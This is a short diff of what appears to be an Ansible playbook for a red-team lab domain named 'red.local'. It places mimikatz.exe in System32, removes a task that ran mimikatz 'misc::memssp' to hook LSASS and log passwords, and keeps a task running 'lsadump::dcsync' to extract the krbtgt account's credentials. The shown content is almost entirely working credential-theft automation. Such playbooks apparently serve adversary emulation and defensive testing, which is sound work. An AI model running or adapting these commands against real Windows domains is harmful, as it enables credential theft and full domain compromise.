@@ -8,14 +8,6 @@
         src: ../rsrc/mimikatz.exe
         dest: C:\Windows\System32\mimikatz.exe
 
-    - name: Execute misc::memssp to hook LSASS and start logging
-      win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
-      register: memssp_output
-
-    - name: Show Execution Results
-      debug:
-        msg: "{{ memssp_output.stdout }}"
-
     - name: Run DCSync command
       win_shell: C:\Windows\System32\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:red.local /user:krbtgt" "exit"
       register: dcsync_output
